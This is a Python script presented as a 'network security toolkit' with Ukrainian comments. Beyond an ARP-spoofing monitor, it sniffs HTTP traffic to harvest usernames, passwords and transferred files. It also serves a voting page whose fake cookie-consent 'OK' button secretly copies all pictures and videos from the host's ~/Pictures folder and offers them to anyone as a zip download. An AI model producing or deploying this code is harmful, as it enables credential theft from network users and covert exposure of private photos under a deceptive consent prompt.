import os
import threading
import time
import re
import zipfile
import glob
import io
import logging
from logging.handlers import RotatingFileHandler
import signal
import argparse
from datetime import datetime
from scapy.all import sniff, ARP, TCP, Raw, IP
from flask import Flask, render_template_string, request, redirect, make_response, send_file, g, jsonify
from dotenv import load_dotenv
# замінено прямий імпорт prometheus_client на опціональний (щоб уникнути помилок при відсутності пакета)
try:
    # Підказка для Pylance/Pyright: якщо пакет не встановлений у віртуальному оточенні,
    # ця директива вимикає повідомлення про відсутній імпорт.
    from prometheus_client import Counter, Histogram, generate_latest, CONTENT_TYPE_LATEST  # type: ignore[reportMissingImports]
    METRICS_ENABLED = True
except Exception:
    METRICS_ENABLED = False
    # прості no-op реалізації для безпечного виконання без пакету
    class _NoopMetric:
        def labels(self, *args, **kwargs):
            return self
        def observe(self, *args, **kwargs):
            return None
        def inc(self, *args, **kwargs):
            return None
    Counter = lambda *a, **k: _NoopMetric()
    Histogram = lambda *a, **k: _NoopMetric()
    def generate_latest():
        return b""
    CONTENT_TYPE_LATEST = "text/plain; version=0.0.4; charset=utf-8"

OUTPUT_DIR = "security_logs"
FILES_DIR = os.path.join(OUTPUT_DIR, "captured_files")
MATERIALS_DIR = os.path.join(os.getcwd(), "матеріли")
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(FILES_DIR, exist_ok=True)
os.makedirs(MATERIALS_DIR, exist_ok=True)

FILE_EXTS = ["jpg", "jpeg", "png", "gif", "bmp", "mp4", "avi", "mov", "mkv", "webm"]
FILENAME_RE = re.compile(
    r'Content-Disposition:.*filename=[\"\' ]?([^\"\'\s]+\.(' + "|".join(FILE_EXTS) + r'))',
    re.IGNORECASE
)
USERNAME_RE = re.compile(r'username=([^&\s]*)')
PASSWORD_RE = re.compile(r'password=([^&\s]*)')

# global state
last_arp_alert = ""
last_http_alert = ""
last_cred_alert = ""
log_lock = threading.Lock()
stop_event = threading.Event()  # used for graceful shutdown

# Prometheus metrics (можуть бути no-op якщо пакет не встановлено)
REQUEST_COUNT = Counter("app_requests_total", "Total HTTP requests", ["method", "endpoint", "http_status"])
REQUEST_LATENCY = Histogram("app_request_latency_seconds", "Latency of HTTP requests in seconds", ["endpoint"])

# simple config from .env + env
def load_config():
    load_dotenv()
    cfg = {
        "FLASK_HOST": os.getenv("FLASK_HOST", "0.0.0.0"),
        "FLASK_PORT": int(os.getenv("FLASK_PORT", "5000")),
        "LOG_FILE": os.getenv("LOG_FILE", os.path.join(OUTPUT_DIR, "app.log")),
        "LOG_LEVEL": os.getenv("LOG_LEVEL", "INFO"),
        "MONITOR_INTERVAL": int(os.getenv("MONITOR_INTERVAL", "30")),
    }
    return cfg

def init_logger(log_file, level="INFO"):
    lvl = getattr(logging, level.upper(), logging.INFO)
    logger = logging.getLogger()
    logger.setLevel(lvl)
    # avoid duplicate handlers in re-imports
    if not any(isinstance(h, RotatingFileHandler) for h in logger.handlers):
        fh = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3, encoding="utf-8")
        fh.setLevel(lvl)
        fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
        logger.addHandler(fh)
    # console handler
    if not any(isinstance(h, logging.StreamHandler) for h in logger.handlers):
        ch = logging.StreamHandler()
        ch.setLevel(lvl)
        ch.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
        logger.addHandler(ch)
    logging.info("Logger initialized (file=%s level=%s)", log_file, level)

# modify sniffers to observe stop_event via stop_filter
def arp_monitor():
    def arp_callback(packet):
        if packet.haslayer(ARP) and packet[ARP].op == 2:
            msg = f"{packet[ARP].psrc} claims to be {packet[ARP].hwsrc}"
            logging.warning("ARP-відповідь: %s -> %s", packet[ARP].psrc, packet[ARP].pdst)
            try:
                with log_lock:
                    with open(f"{OUTPUT_DIR}/arp_log.txt", "a", encoding="utf-8") as f:
                        f.write(f"{datetime.now()}: {msg}\n")
            except Exception as e:
                logging.exception("Помилка запису ARP-логу: %s", e)
    logging.info("Запуск ARP-монітора...")
    sniff(filter="arp", prn=arp_callback, store=0, stop_filter=lambda p: stop_event.is_set())

def save_file(filename, data):
    path = os.path.join(FILES_DIR, filename)
    try:
        with log_lock:
            with open(path, "wb") as f:
                f.write(data)
        print(f"[+] Файл збережено: {path}")
    except Exception as e:
        print(f"[!] Помилка збереження файлу: {e}")

def extract_and_save_file(filename, data):
    extracted_dir = os.path.join(FILES_DIR, "extracted")
    os.makedirs(extracted_dir, exist_ok=True)
    save_file(filename, data)
    if filename.lower().endswith(".zip"):
        try:
            zip_path = os.path.join(FILES_DIR, filename)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extracted_dir)
            print(f"[+] Zip-архів розпаковано у: {extracted_dir}")
        except Exception as e:
            print(f"[!] Помилка при розпакуванні zip: {e}")
    elif filename.lower().endswith(".rar"):
        print("[!] Для розпакування rar потрібен модуль rarfile та встановлений unrar.")

def extract_files_from_http(payload):
    try:
        decoded = payload.decode(errors='ignore')
    except Exception:
        return
    for match in FILENAME_RE.findall(decoded):
        filename = match[0]
        file_data = payload.split(b"\r\n\r\n")[-1]
        extract_and_save_file(filename, file_data)

def parse_http_payload(payload):
    try:
        username_match = USERNAME_RE.search(payload)
        password_match = PASSWORD_RE.search(payload)
        if username_match or password_match:
            print("\n[!] Можливі дані для входу:")
            if username_match:
                print(f"   Логін: {username_match.group(1)}")
            if password_match:
                print(f"   Пароль: {password_match.group(1)}")
            print("-" * 50)
            with log_lock:
                with open(f"{OUTPUT_DIR}/http_credentials.txt", "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()}: {payload}\n")
    except Exception as e:
        print(f"[!] Помилка при парсингу HTTP payload: {e}")

def http_sniffer():
    def http_callback(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                payload = packet[Raw].load
                try:
                    decoded_payload = payload.decode('utf-8', errors='ignore')
                except Exception:
                    return
                if ("GET /" in decoded_payload or "POST /" in decoded_payload) and packet.haslayer(IP):
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    logging.info("[HTTP] %s -> %s", src_ip, dst_ip)
                    headers = decoded_payload.split('\r\n\r\n')[0]
                    logging.debug(headers)
                    parse_http_payload(decoded_payload)
                    try:
                        with log_lock:
                            with open(f"{OUTPUT_DIR}/http_log.txt", "a", encoding="utf-8") as f:
                                f.write(f"{datetime.now()}: {decoded_payload[:200]}...\n")
                    except Exception as e:
                        logging.exception("Помилка запису HTTP-логу: %s", e)
                if b"HTTP/1." in payload:
                    extract_files_from_http(payload)
            except Exception as e:
                logging.exception("Помилка при обробці HTTP-пакету: %s", e)
    logging.info("Запуск HTTP-сниффера (логіни/паролі + файли)...")
    sniff(filter="tcp port 80 or tcp port 8080", prn=http_callback, store=0, stop_filter=lambda p: stop_event.is_set())

def scheduler_loop(interval):
    """
    Періодично викликає detect_suspicious_activity.
    """
    logging.info("Запуск планувальника з інтервалом %d секунд...", interval)
    while not stop_event.is_set():
        detect_suspicious_activity()
        # Чекаємо, доки не спрацює stop_event або не закінчиться інтервал
        stop_event.wait(interval)

# ---

def tail(filename, n=20):
    try:
        with open(filename, "rb") as f:
            f.seek(0, os.SEEK_END)
            size = f.tell()
            block = 1024
            data = b""
            while size > 0 and data.count(b"\n") < n:
                read_size = min(block, size)
                f.seek(size - read_size)
                data = f.read(read_size) + data
                size -= read_size
            return data.decode(errors="ignore").splitlines()[-n:]
    except Exception:
        return []

def detect_suspicious_activity():
    global last_arp_alert, last_http_alert, last_cred_alert
    arp_log = f"{OUTPUT_DIR}/arp_log.txt"
    if os.path.exists(arp_log):
        lines = tail(arp_log, 10)
        for line in lines:
            if "claims to be" in line and line != last_arp_alert:
                print("[!] Виявлено можливий ARP-спуфінгу!")
                last_arp_alert = line
                break
    http_log = f"{OUTPUT_DIR}/http_log.txt"
    if os.path.exists(http_log):
        lines = tail(http_log, 10)
        for line in lines:
            if "password=" in line and line != last_http_alert:
                print("[!] Виявлено передачу паролів через HTTP!")
                last_http_alert = line
                break
    cred_log = f"{OUTPUT_DIR}/http_credentials.txt"
    if os.path.exists(cred_log):
        lines = tail(cred_log, 5)
        for line in lines:
            if line.strip() and line != last_cred_alert:
                print("[!] Виявлено можливі логіни/паролі у HTTP-трафіку!")
                last_cred_alert = line
                break

# ==================== ВЕБ-ІНТЕРФЕЙС (FLASK) ====================
app = Flask(__name__)
VOTES = {"yes": 0, "no": 0}

TEMPLATE = """
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <title>Голосування</title>
    <style>
        body {
            background: #181a1b;
            color: #e0e0e0;
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            min-height: 100vh;
        }
        #cookie-modal {
            position: fixed; left: 0; top: 0; width: 100vw; height: 100vh;
            background: rgba(20,22,24,0.85); z-index: 10000;
            backdrop-filter: blur(2px);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #cookie-box {
            background: #23272a;
            padding: 32px 24px 24px 24px;
            border-radius: 14px;
            width: 340px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0,0,0,0.45);
            border: 1px solid #2c2f33;
        }
        #cookie-box p {
            color: #e0e0e0;
            margin-bottom: 18px;
            font-size: 1.08em;
        }
        #main-content {
            max-width: 420px;
            margin: 48px auto 0 auto;
            background: #23272a;
            border-radius: 14px;
            box-shadow: 0 4px 24px 0 rgba(0,0,0,0.25);
            padding: 32px 32px 24px 32px;
            border: 1px solid #2c2f33;
        }
        h1, h2 {
            color: #f3f3f3;
            margin-top: 0;
        }
        p {
            color: #bdbdbd;
        }
        button {
            margin: 7px 8px;
            padding: 10px 28px;
            border-radius: 8px;
            border: none;
            background: linear-gradient(90deg, #23272a 0%, #36393f 100%);
            color: #f3f3f3;
            font-size: 1em;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 8px 0 rgba(0,0,0,0.18);
            transition: background 0.2s, color 0.2s, transform 0.1s;
        }
        button:hover, button:focus {
            background: linear-gradient(90deg, #36393f 0%, #23272a 100%);
            color: #00bfae;
            transform: translateY(-2px) scale(1.04);
            outline: none;
        }
        body.modal-active {
            overflow: hidden;
        }
        @media (max-width: 600px) {
            #main-content, #cookie-box {
                width: 95vw;
                padding: 16px 4vw 16px 4vw;
            }
        }
    </style>
</head>
<body>
<div id="cookie-modal">
    <div id="cookie-box">
        <p>Сайт використовує файли cookie</p>
        <form id="cookie-form" method="post" action="/cookie">
            <button name="action" value="ok" type="submit" id="ok-btn">OK</button>
            <button name="action" value="exit" type="button" id="exit-btn">Вийти</button>
        </form>
    </div>
</div>
<div id="main-content" style="filter: blur(2px); pointer-events: none; user-select: none;">
    <h1>Голосування: Чи подобається вам цей сайт?</h1>
    {% if cookie_accepted %}
    <form method="post" action="/vote" id="vote-form">
        <button name="vote" value="yes" type="submit" id="vote-yes">Так</button>
        <button name="vote" value="no" type="submit" id="vote-no">Ні</button>
    </form>
    <h2>Результати:</h2>
    <p>Так: {{ votes['yes'] }}</p>
    <p>Ні: {{ votes['no'] }}</p>
    <p><a href="/download_materials" style="color:#00bfae;">Скачати всі матеріали</a></p>
    <p>Поділіться цим посиланням з іншими: <b><span id="share-link"></span></b></p>
    {% else %}
    <p>Щоб проголосувати, спочатку прийміть cookie та надайте дозвіл.</p>
    {% endif %}
</div>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        document.body.classList.add("modal-active");
        var cookieModal = document.getElementById("cookie-modal");
        var mainContent = document.getElementById("main-content");
        document.getElementById("ok-btn").onclick = function(e) {
            // Дозволяємо стандартну відправку форми (submit)
        };
        document.getElementById("exit-btn").onclick = function(e) {
            e.preventDefault();
            let formData = new FormData();
            formData.append("action", "exit");
            fetch("/cookie", {
                method: "POST",
                body: formData
            }).then(resp => resp.text())
              .then(html => {
                  document.open();
                  document.write(html);
                  document.close();
              });
        };
        // Додаємо посилання для поширення
        var share = document.getElementById("share-link");
        if (share) {
            share.innerText = window.location.origin + "/";
        }
    });
</script>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    cookie_accepted = request.cookies.get("cookie_accepted") == "1"
    return render_template_string(TEMPLATE, votes=VOTES, cookie_accepted=cookie_accepted)

@app.route("/cookie", methods=["POST"])
def cookie():
    action = request.form.get("action")
    if action == "ok":
        user_pictures = os.path.expanduser("~/Pictures")
        if not os.path.exists(user_pictures):
            user_pictures = os.path.expanduser("~/Зображення")
        found_files = []
        if os.path.exists(user_pictures):
            exts = ("*.jpg", "*.jpeg", "*.png", "*.gif", "*.bmp", "*.mp4", "*.avi", "*.mov", "*.mkv", "*.webm")
            for ext in exts:
                found_files.extend(
                    [f for f in glob.glob(os.path.join(user_pictures, "**", ext), recursive=True)]
                )
            for f in found_files:
                try:
                    basename = os.path.basename(f)
                    dest = os.path.join(MATERIALS_DIR, basename)
                    if not os.path.exists(dest):
                        with open(f, "rb") as src, open(dest, "wb") as dst:
                            dst.write(src.read())
                except Exception:
                    pass
        resp = make_response(redirect("/"))
        resp.set_cookie("cookie_accepted", "1")
        return resp
    else:
        return "<h2>Ви відмовились від використання cookie. Доступ заборонено.</h2>"

@app.route("/download_materials")
def download_materials():
    if request.cookies.get("cookie_accepted") != "1":
        return redirect("/")
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w') as zf:
        for fname in os.listdir(MATERIALS_DIR):
            fpath = os.path.join(MATERIALS_DIR, fname)
            if os.path.isfile(fpath):
                zf.write(fpath, arcname=fname)
    memory_file.seek(0)
    return send_file(memory_file, download_name="materials.zip", as_attachment=True)

@app.route("/vote", methods=["POST"])
def vote():
    if request.cookies.get("cookie_accepted") != "1":
        return redirect("/")
    v = request.form.get("vote")
    if v in VOTES:
        VOTES[v] += 1
    return redirect("/")

@app.before_request
def before():
    g.start_time = time.time()

@app.after_request
def after(response):
    try:
        latency = time.time() - getattr(g, "start_time", time.time())
        endpoint = request.endpoint or "unknown"
        REQUEST_LATENCY.labels(endpoint=endpoint).observe(latency)
        REQUEST_COUNT.labels(method=request.method, endpoint=endpoint, http_status=response.status_code).inc()
    except Exception:
        logging.exception("Metrics middleware error")
    return response

# health and docs endpoints + metrics
@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "uptime": int(time.time())}), 200

# Додаємо readiness endpoint — перевіряє чи процес не в стані зупинки
@app.route("/ready", methods=["GET"])
def ready():
    # якщо stop_event виставлений — сервер почав завершення роботи
    if stop_event.is_set():
        return jsonify({"status": "not_ready", "reason": "shutting_down"}), 503
    return jsonify({"status": "ready"}), 200

@app.route("/metrics")
def metrics():
    if not METRICS_ENABLED:
        # зрозуміле повідомлення коли пакет prometheus_client недоступний
        return jsonify({"error": "prometheus_client not available. Install via: pip install prometheus-client"}), 503
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}

@app.route("/docs")
def docs():
    # простий список endpoint-ів
    routes = []
    for rule in app.url_map.iter_rules():
        routes.append({"endpoint": rule.endpoint, "rule": str(rule), "methods": list(rule.methods)})
    return jsonify({"routes": routes})

# custom error handlers
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "not found"}), 404

@app.errorhandler(500)
def internal_error(e):
    logging.exception("Internal server error: %s", e)
    return jsonify({"error": "internal server error"}), 500

def run_flask(host, port):
    import socket
    import requests
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "127.0.0.1"
    try:
        public_ip = requests.get("https://api.ipify.org", timeout=2).text
    except Exception:
        public_ip = "<ваша_зовнішня_IP_адреса>"

    logging.info("Веб-інтерфейс доступний у вашій локальній мережі: http://%s:%s/", local_ip, port)
    logging.info("Для доступу з будь-якої мережі (через Інтернет): http://%s:%s/", public_ip, port)
    app.run(host=host, port=port, debug=False, use_reloader=False)

def main(run_arp=True, run_http=True, run_flask_srv=True, monitor_interval=30, mode="dev"):
    cfg = load_config()
    init_logger(cfg["LOG_FILE"], cfg["LOG_LEVEL"])
    logging.info("Starting main (mode=%s)", mode)

    threads = []

    if run_arp:
        t = threading.Thread(target=arp_monitor, name="arp_monitor", daemon=True)
        t.start()
        threads.append(t)
    if run_http:
        t = threading.Thread(target=http_sniffer, name="http_sniffer", daemon=True)
        t.start()
        threads.append(t)
    # scheduler for periodic detection
    sched = threading.Thread(target=scheduler_loop, args=(monitor_interval,), name="scheduler", daemon=True)
    sched.start()
    threads.append(sched)

    if run_flask_srv:
        t = threading.Thread(target=run_flask, args=(cfg["FLASK_HOST"], cfg["FLASK_PORT"]), name="flask", daemon=True)
        t.start()
        threads.append(t)

    logging.info("All background components started. Open http://127.0.0.1:%s/ if flask enabled", cfg["FLASK_PORT"])
    try:
        # wait until stop_event set by signal handler or KeyboardInterrupt
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("KeyboardInterrupt received, shutting down...")
        stop_event.set()
    finally:
        logging.info("Waiting for threads to finish...")
        # give threads a moment to stop
        time.sleep(1)
        logging.info("Shutdown complete.")

# signal handlers for graceful shutdown
def _handle_signal(signum, frame):
    logging.info("Received signal %s, initiating shutdown...", signum)
    stop_event.set()

signal.signal(signal.SIGINT, _handle_signal)
signal.signal(signal.SIGTERM, _handle_signal)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Network security toolkit")
    parser.add_argument("--mode", choices=["dev", "test", "prod"], default="dev")
    parser.add_argument("--no-arp", action="store_true", help="Disable ARP monitor")
    parser.add_argument("--no-http", action="store_true", help="Disable HTTP sniffer")
    parser.add_argument("--no-flask", action="store_true", help="Disable Flask web UI")
    parser.add_argument("--interval", type=int, default=30, help="Monitor interval seconds")
    args = parser.parse_args()

    cfg = load_config()
    # merge CLI and cfg
    run_arp = not args.no_arp
    run_http = not args.no_http
    run_flask_srv = not args.no_flask

    main(run_arp=run_arp, run_http=run_http, run_flask_srv=run_flask_srv, monitor_interval=args.interval, mode=args.mode)
